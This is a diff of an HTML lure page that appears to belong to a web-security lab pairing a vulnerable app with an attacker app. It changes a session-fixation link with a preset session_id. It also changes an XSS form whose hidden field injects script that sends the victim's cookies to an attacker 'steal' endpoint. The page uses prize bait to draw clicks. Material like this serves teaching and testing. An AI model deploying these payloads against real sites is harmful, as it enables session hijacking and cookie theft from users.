@@ -5,15 +5,14 @@
     </head>
     <body>
         <h1>Welcome to my 100% legit website!</h1>
-        <p>Please log in to our partner site to win a prize!</p>
 
         <h3>Session Fixation</h3>
         <p>
             <a
-                href="http://localhost:5001/login?session_id=69420-6736"
+                href="${VULN_APP_URL}/login?session_id=69420-6736"
                 target="_blank"
             >
-                Click here to log in and claim your prize!
+                Click here to log in and claim your money!
             </a>
         </p>
         <hr />
@@ -21,16 +20,16 @@
         <h3>XSS Cookie Stealing Demo</h3>
         <p>(You must be logged in to vuln-app for this to work)</p>
         <form
-            action="http://localhost:5001/dashboard"
+            action="${VULN_APP_URL}/dashboard"
             method="GET"
             target="_blank"
         >
             <input
                 type="hidden"
                 name="display_name"
-                value="<script>new Image().src='http://localhost:8080/steal?c='+document.cookie</script>"
+                value="<script>new Image().src='${ATTACKER_APP_URL}/steal?c='+document.cookie</script>"
             />
-            <button>Click here to see our "special" search results!</button>
+            <button>Click here to see your prizes!</button>
         </form>
     </body>
 </html>
